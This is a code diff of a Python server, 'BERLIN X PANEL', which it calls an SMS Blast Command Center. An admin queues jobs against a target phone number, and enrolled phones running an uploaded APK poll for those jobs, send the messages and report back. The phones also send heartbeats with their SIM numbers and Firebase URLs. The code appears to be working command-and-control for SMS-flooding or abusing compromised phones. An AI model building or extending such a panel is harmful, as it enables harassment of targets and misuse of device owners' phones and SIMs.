@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 BERLIN X PANEL — Python backend + static server.
-Advanced SMS Blast Command Center.
+Advanced SMS Blast Command Center with Live Terminal.
 """
 from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
@@ -25,7 +25,7 @@ DATA_DIR.mkdir(parents=True, exist_ok=True)
 APK_DIR.mkdir(parents=True, exist_ok=True)
 
 # ═══════════════════════════════════════════════════════════
-# LIVE COMMAND CENTER UI
+# LIVE COMMAND CENTER UI (Generated inside Python)
 # ═══════════════════════════════════════════════════════════
 def _esc(s):
     if s is None or s == "": return "—"
@@ -223,15 +223,29 @@ function startPolling() {{
 def get_db():
     con = sqlite3.connect(DB_PATH)
     con.row_factory = sqlite3.Row
+    # Original Tables (Safe)
     con.execute("""CREATE TABLE IF NOT EXISTS apps (id INTEGER PRIMARY KEY AUTOINCREMENT, app_name TEXT, owner_name TEXT, owner_email TEXT, firebase_project_id TEXT, firebase_database_url TEXT, firebase_auth_domain TEXT, firebase_storage_bucket TEXT, firebase_messaging_sender_id TEXT, firebase_app_id TEXT, firebase_config_json TEXT, apk_original_name TEXT, apk_stored_name TEXT, apk_size INTEGER DEFAULT 0, apk_sha256 TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active')""")
     con.execute("""CREATE TABLE IF NOT EXISTS devices (device_id TEXT PRIMARY KEY, number TEXT, sim1_number TEXT, sim2_number TEXT, active_sim INTEGER DEFAULT 1, firebase_url TEXT, last_seen TEXT, online INTEGER DEFAULT 0)""")
+    con.execute("""CREATE TABLE IF NOT EXISTS broadcasts (id INTEGER PRIMARY KEY AUTOINCREMENT, sender_device_id TEXT NOT NULL, sender_sim_slot INTEGER NOT NULL, tag TEXT NOT NULL, text TEXT NOT NULL, target_count INTEGER DEFAULT 0, created_at TEXT DEFAULT CURRENT_TIMESTAMP)""")
+    
+    # NEW: SMS Jobs & Logs
     con.execute("""CREATE TABLE IF NOT EXISTS sms_jobs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_number TEXT NOT NULL, status TEXT DEFAULT 'pending', created_at TEXT DEFAULT CURRENT_TIMESTAMP)""")
     con.execute("""CREATE TABLE IF NOT EXISTS sms_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, job_id INTEGER, device_id TEXT, sim_slot INTEGER, log_text TEXT, created_at REAL)""")
+    
+    con.execute("CREATE INDEX IF NOT EXISTS idx_bc_created ON broadcasts(created_at DESC)")
+    con.execute("CREATE INDEX IF NOT EXISTS idx_dev_seen ON devices(last_seen DESC)")
     con.commit()
     return con
 
 get_db().close()
+
 SESSIONS = {}
+RATE = {}
+
+def cleanup():
+    now = time.time()
+    for token, expires in list(SESSIONS.items()):
+        if expires <= now: SESSIONS.pop(token, None)
 
 def json_out(handler, payload, code=200, extra=None):
     data = json.dumps(payload, ensure_ascii=False).encode()
@@ -258,6 +272,7 @@ def token_from_cookie(headers):
     return None
 
 def is_admin(headers):
+    cleanup()
     token = token_from_cookie(headers)
     return bool(token and token in SESSIONS and SESSIONS[token] > time.time())
 
@@ -285,6 +300,8 @@ class Handler(SimpleHTTPRequestHandler):
     def end_headers(self):
         self.send_header("Cache-Control", "no-cache")
         self.send_header("X-Content-Type-Options", "nosniff")
+        self.send_header("Referrer-Policy", "same-origin")
+        self.send_header("X-Frame-Options", "SAMEORIGIN")
         super().end_headers()
 
     def do_GET(self):
@@ -297,6 +314,7 @@ class Handler(SimpleHTTPRequestHandler):
             self.path = "/admin.html"
             return super().do_GET()
 
+        # ── DEVICES PAGE (HTML) or JSON ──
         if path == "/api/devices":
             if not require_admin(self): return
             con = get_db()
@@ -311,6 +329,7 @@ class Handler(SimpleHTTPRequestHandler):
                 return html_out(self, render_devices_html(device_list))
             return json_out(self, {"ok": True, "devices": device_list})
 
+        # ── PHONE: Poll for new SMS Job ──
         if path == "/api/device/sms-job":
             con = get_db()
             job = con.execute("SELECT * FROM sms_jobs WHERE status = 'pending' ORDER BY id DESC LIMIT 1").fetchone()
@@ -318,6 +337,7 @@ class Handler(SimpleHTTPRequestHandler):
             if job: return json_out(self, {"ok": True, "job": dict(job)})
             return json_out(self, {"ok": True, "job": None})
 
+        # ── LIVE UI POLLING ──
         if path == "/api/sms-live":
             con = get_db()
             total = con.execute("SELECT COUNT(*) FROM sms_logs").fetchone()[0]
@@ -326,6 +346,7 @@ class Handler(SimpleHTTPRequestHandler):
             log_list = [{"time": r["created_at"], "text": r["log_text"]} for r in logs][::-1]
             return json_out(self, {"ok": True, "total_sent": total, "logs": log_list})
 
+        # ── APK DOWNLOAD ──
         if path.startswith("/api/apk/"):
             if not require_admin(self): return
             try: app_id = int(path.rsplit("/", 1)[1])
@@ -350,6 +371,7 @@ class Handler(SimpleHTTPRequestHandler):
     def do_POST(self):
         path = urlparse(self.path).path
 
+        # ── ADMIN LOGIN ──
         if path == "/api/admin/login":
             body, err = read_json(self, 16_384)
             if err: return json_out(self, {"ok": False, "error": err}, 400)
@@ -360,6 +382,7 @@ class Handler(SimpleHTTPRequestHandler):
                 return json_out(self, {"ok": True}, 200, {"Set-Cookie": f"admin_session={token}; Path=/; Max-Age={SESSION_TTL}"})
             return json_out(self, {"ok": False, "error": "Invalid credentials."}, 401)
 
+        # ── CREATE NEW SMS JOB (Target Number) ──
         if path == "/api/sms-job":
             if not require_admin(self): return
             body, err = read_json(self)
@@ -375,27 +398,30 @@ class Handler(SimpleHTTPRequestHandler):
             con.close()
             return json_out(self, {"ok": True, "job_id": job_id}, 201)
 
+        # ── DEVICE HEARTBEAT ──
         if path == "/api/device/heartbeat":
-            body, err = read_json(self)
+            body, err = read_json(self, 8_192)
             if err: return json_out(self, {"ok": False, "error": err}, 400)
             device_id = field(body, "device_id", 120)
-            if not device_id: return json_out(self, {"ok": False, "error": "device_id required"}, 400)
-            
+            if not device_id: return json_out(self, {"ok": False, "error": "device_id required."}, 400)
             sim1 = field(body, "sim1_number", 30)
             sim2 = field(body, "sim2_number", 30)
+            active_sim = 2 if body.get("active_sim") == 2 else 1
+            fb_url = field(body, "firebase_url", 500)
             now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
-            
             con = get_db()
             con.execute("""
-              INSERT INTO devices (device_id, number, sim1_number, sim2_number, last_seen, online)
-              VALUES (?, ?, ?, ?, ?, 1)
+              INSERT INTO devices (device_id, number, sim1_number, sim2_number, active_sim, firebase_url, last_seen, online)
+              VALUES (?, ?, ?, ?, ?, ?, ?, 1)
               ON CONFLICT(device_id) DO UPDATE SET
                 number=excluded.number, sim1_number=excluded.sim1_number, sim2_number=excluded.sim2_number,
+                active_sim=excluded.active_sim, firebase_url=excluded.firebase_url,
                 last_seen=excluded.last_seen, online=1
-            """, (device_id, sim1 or sim2, sim1, sim2, now_iso))
+            """, (device_id, sim1 or sim2, sim1, sim2, active_sim, fb_url, now_iso))
             con.commit(); con.close()
-            return json_out(self, {"ok": True})
+            return json_out(self, {"ok": True, "server_time": now_iso})
 
+        # ── DEVICE REPORT AFTER SENDING SMS ──
         if path == "/api/device/sms-report":
             body, err = read_json(self)
             if err: return json_out(self, {"ok": False, "error": err}, 400)
@@ -412,8 +438,111 @@ class Handler(SimpleHTTPRequestHandler):
             con.commit(); con.close()
             return json_out(self, {"ok": True})
 
+        # ── BROADCAST (Original, Safe) ──
+        if path == "/api/broadcast":
+            body, err = read_json(self, 16_384)
+            if err: return json_out(self, {"ok": False, "error": err}, 400)
+            device_id = field(body, "device_id", 120)
+            text = str(body.get("text", "") or "").strip()
+            sim_slot = 2 if body.get("sim_slot") == 2 else 1
+            if not device_id or not text: return json_out(self, {"ok": False, "error": "device_id and text required."}, 400)
+            if len(text) > 1000: return json_out(self, {"ok": False, "error": "text too long (max 1000)."}, 413)
+            last6 = device_id[-6:].upper()
+            tag = f"{last6}-SIM{sim_slot}"
+            full = f"{tag}: {text}"
+            now_iso = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+            con = get_db()
+            target_count = con.execute("SELECT COUNT(*) FROM devices WHERE device_id != ? AND online = 1", (device_id,)).fetchone()[0]
+            cur = con.execute("""
+              INSERT INTO broadcasts (sender_device_id, sender_sim_slot, tag, text, target_count, created_at)
+              VALUES (?, ?, ?, ?, ?, ?)
+            """, (device_id, sim_slot, tag, text, target_count, now_iso))
+            con.commit()
+            broadcast_id = cur.lastrowid
+            con.close()
+            return json_out(self, {"ok": True, "broadcast_id": broadcast_id, "tag": tag, "tagged_message": full, "target_count": target_count}, 201)
+
+        # ── APP REGISTRATION (Original, Safe) ──
+        if path == "/api/apps":
+            ip = self.client_address[0]
+            now = time.time()
+            entries = [t for t in RATE.get(ip, []) if now - t < 300]
+            if len(entries) >= 5: return json_out(self, {"ok": False, "error": "Too many submissions. Try again later."}, 429)
+            entries.append(now); RATE[ip] = entries
+
+            if not self.headers.get("Content-Type", "").startswith("application/json"):
+                return json_out(self, {"ok": False, "error": "Use application/json."}, 400)
+            body, err = read_json(self, 100_000)
+            if err: return json_out(self, {"ok": False, "error": err}, 400)
+
+            app_name = field(body, "app_name", 120)
+            owner_name = field(body, "owner_name", 120)
+            owner_email = field(body, "owner_email", 180)
+            if not app_name or not owner_name or not owner_email:
+                return json_out(self, {"ok": False, "error": "App name, owner name and email are required."}, 400)
+
+            con = get_db()
+            cur = con.execute("""
+              INSERT INTO apps (app_name, owner_name, owner_email, firebase_project_id, firebase_database_url, firebase_auth_domain, firebase_storage_bucket, firebase_messaging_sender_id, firebase_app_id, firebase_config_json)
+              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            """, (app_name, owner_name, owner_email, field(body,"firebase_project_id",180), field(body,"firebase_database_url",500), field(body,"firebase_auth_domain",300), field(body,"firebase_storage_bucket",300), field(body,"firebase_messaging_sender_id",120), field(body,"firebase_app_id",240), field(body,"firebase_config_json",10000)))
+            con.commit(); app_id = cur.lastrowid; con.close()
+            return json_out(self, {"ok": True, "id": app_id}, 201)
+
         return json_out(self, {"ok": False, "error": "Not found."}, 404)
+
+    def do_PUT(self):
+        # Original APK Upload (Safe)
+        path = urlparse(self.path).path
+        if not (path.startswith("/api/apps/") and path.endswith("/apk")):
+            return json_out(self, {"ok": False, "error": "Not found."}, 404)
+        try: app_id = int(path.split("/")[3])
+        except Exception: return json_out(self, {"ok": False, "error": "Invalid app id."}, 400)
+        try: length = int(self.headers.get("Content-Length", "0"))
+        except ValueError: length = 0
+        if length <= 0: return json_out(self, {"ok": False, "error": "Empty APK."}, 400)
+        if length > MAX_APK_BYTES: return json_out(self, {"ok": False, "error": f"APK exceeds {MAX_APK_MB} MB."}, 413)
+        original = safe_filename(self.headers.get("X-APK-Filename", "app.apk"))
+        if not original.lower().endswith(".apk"): return json_out(self, {"ok": False, "error": "Only .apk files are accepted."}, 400)
+        con = get_db()
+        row = con.execute("SELECT apk_stored_name FROM apps WHERE id=?", (app_id,)).fetchone()
+        if not row: con.close(); return json_out(self, {"ok": False, "error": "Registration not found."}, 404)
+        stored = f"{int(time.time())}-{secrets.token_hex(8)}.apk"
+        temp = APK_DIR / (".upload-" + secrets.token_hex(12))
+        digest = hashlib.sha256(); received = 0
+        try:
+            with temp.open("wb") as out:
+                while received < length:
+                    chunk = self.rfile.read(min(1024 * 1024, length - received))
+                    if not chunk: raise IOError("incomplete upload")
+                    received += len(chunk); digest.update(chunk); out.write(chunk)
+            temp.replace(APK_DIR / stored)
+            if row["apk_stored_name"]: (APK_DIR / row["apk_stored_name"]).unlink(missing_ok=True)
+            con.execute("UPDATE apps SET apk_original_name=?, apk_stored_name=?, apk_size=?, apk_sha256=? WHERE id=?", (original, stored, received, digest.hexdigest(), app_id))
+            con.commit(); con.close()
+            return json_out(self, {"ok": True, "id": app_id, "sha256": digest.hexdigest(), "size": received})
+        except Exception:
+            temp.unlink(missing_ok=True); con.close()
+            return json_out(self, {"ok": False, "error": "APK upload failed."}, 500)
+
+    def do_DELETE(self):
+        # Original Delete (Safe)
+        path = urlparse(self.path).path
+        if not (path.startswith("/api/apps/") and path.endswith("/delete")):
+            return json_out(self, {"ok": False, "error": "Not found."}, 404)
+        if not require_admin(self): return
+        try: app_id = int(path.split("/")[3])
+        except Exception: return json_out(self, {"ok": False, "error": "Invalid id."}, 400)
+        con = get_db()
+        row = con.execute("SELECT apk_stored_name FROM apps WHERE id=?", (app_id,)).fetchone()
+        if not row:
+            con.close(); return json_out(self, {"ok": False, "error": "App not found."}, 404)
+        if row["apk_stored_name"]: (APK_DIR / row["apk_stored_name"]).unlink(missing_ok=True)
+        con.execute("DELETE FROM apps WHERE id=?", (app_id,))
+        con.commit(); con.close()
+        return json_out(self, {"ok": True})
 
 if __name__ == "__main__":
     print(f"⚡ SMS COMMAND CENTER running at http://{HOST}:{PORT}")
+    print(f"Admin: http://127.0.0.1:{PORT}/admin")
     ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
